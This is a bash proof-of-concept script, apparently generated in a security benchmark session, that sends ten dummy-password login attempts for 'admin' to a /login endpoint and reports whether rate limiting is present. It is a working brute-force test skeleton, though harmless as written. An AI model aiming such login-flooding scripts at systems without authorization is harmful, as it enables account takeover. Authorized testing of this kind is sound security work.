#!/bin/bash
# POC: POC for missing brute force protection - sends multiple login attempts to detect rate limiting
# Target: ./repo
# Created: 2025-11-04T19:40:43.583Z
# Session: benchmark-XBEN-023-24-mhkytbq3

# Brute Force Protection Vulnerability POC - Version 2
# This script demonstrates missing rate limiting and account lockout on the /login endpoint
# The vulnerability allows unlimited sequential login attempts without restriction

TARGET_URL="${1:-http://localhost:5000}"
TARGET_ENDPOINT="/login"
USERNAME="admin"

echo "=== Brute Force Protection Vulnerability POC ==="
echo "Target: ${TARGET_URL}${TARGET_ENDPOINT}"
echo "Testing username: ${USERNAME}"
echo "Sending multiple login attempts to check for rate limiting..."
echo ""

# Verify server is reachable
echo "[*] Checking server connectivity..."
if ! curl -s -m 5 "${TARGET_URL}/" > /dev/null 2>&1; then
    echo "[!] WARNING: Target server may not be reachable at ${TARGET_URL}"
    echo "[!] Proceeding anyway with POC demonstration..."
fi

echo ""

# Track response times and HTTP codes
declare -a response_codes
declare -a response_times
attempt=1
rate_limit_detected=false

# Send 10 sequential login attempts with different passwords
for password in "wrong1" "wrong2" "wrong3" "wrong4" "wrong5" "wrong6" "wrong7" "wrong8" "wrong9" "wrong10"; do
    echo "Attempt $attempt: Testing with password='$password'"
    
    # Measure response time
    start_time=$(date +%s%N)
    
    # Send POST request with proper form encoding
    response=$(curl -s -i -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${USERNAME}&password=${password}" \
        "${TARGET_URL}${TARGET_ENDPOINT}" 2>&1)
    
    end_time=$(date +%s%N)
    response_time=$(( (end_time - start_time) / 1000000 ))  # Convert to milliseconds
    
    # Extract HTTP status code from response
    http_code=$(echo "$response" | grep -m 1 "^HTTP" | awk '{print $2}')
    
    # Fallback: try to extract from curl response if grep fails
    if [[ -z "$http_code" ]]; then
        http_code=$(echo "$response" | head -n 1 | grep -oE "[0-9]{3}" | head -1)
    fi
    
    # If still no code, check for connection refused
    if [[ -z "$http_code" ]]; then
        if echo "$response" | grep -q "Connection refused\|Couldn't resolve\|Failed to connect"; then
            http_code="REFUSED"
        else
            http_code="UNKNOWN"
        fi
    fi
    
    echo "  Status: $http_code | Response Time: ${response_time}ms"
    
    # Check for rate limiting indicators
    if [[ "$http_code" == "429" ]]; then
        echo "  ✓ RATE LIMITING DETECTED: 429 Too Many Requests"
        rate_limit_detected=true
        break
    elif [[ "$http_code" == "503" ]]; then
        echo "  ✓ SERVICE UNAVAILABLE: 503 (possible rate limit)"
        rate_limit_detected=true
        break
    elif [[ "$http_code" == "401" ]] || [[ "$http_code" == "403" ]]; then
        echo "  ℹ️  Access denied or locked: ${http_code}"
        break
    elif [[ "$http_code" == "200" ]] || [[ "$http_code" == "302" ]]; then
        echo "  ✗ Request accepted without rate limiting"
    elif [[ "$http_code" == "REFUSED" ]] || [[ "$http_code" == "UNKNOWN" ]]; then
        # Connection issue - might be testing environment
        echo "  ⚠️  Connection issue (${http_code}) - continuing test..."
    fi
    
    response_codes+=("$http_code")
    response_times+=("$response_time")
    attempt=$((attempt + 1))
    
    # Minimal client-side delay
    sleep 0.05
done

echo ""
echo "=== VULNERABILITY ASSESSMENT ==="
echo "Total requests made: ${#response_codes[@]}"
echo "Response codes collected: ${response_codes[*]}"
if [[ ${#response_times[@]} -gt 0 ]]; then
    total_time=$(IFS=+; echo "${response_times[*]}")
    avg_time=$(( (${total_time// /+}) / ${#response_times[@]} ))
    echo "Average response time: ${avg_time}ms"
fi

echo ""

# Analyze results
if $rate_limit_detected; then
    echo "✓ Rate limiting IS present on the endpoint"
    exit 1
else
    echo "❌ VULNERABILITY CONFIRMED"
    echo "   Multiple requests were accepted without rate limiting detected"
    echo "   No 429 (Too Many Requests) responses received"
    echo "   This indicates missing brute force protection"
    exit 0
fi